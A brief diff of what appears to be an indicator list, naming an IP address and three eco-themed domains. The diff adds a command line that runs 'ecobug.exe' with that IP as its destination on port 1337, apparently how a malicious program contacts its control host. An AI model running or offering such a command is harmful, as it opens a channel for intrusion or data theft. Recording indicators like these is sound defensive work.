@@ -11,3 +11,5 @@ ip 98.117.26.236
 energy-trends4u.net
 news-on-industry.com
 eco-awareness-update.net
+
+ecobug.exe --timeout 6000 --dest 98.117.26.236 --port 1337
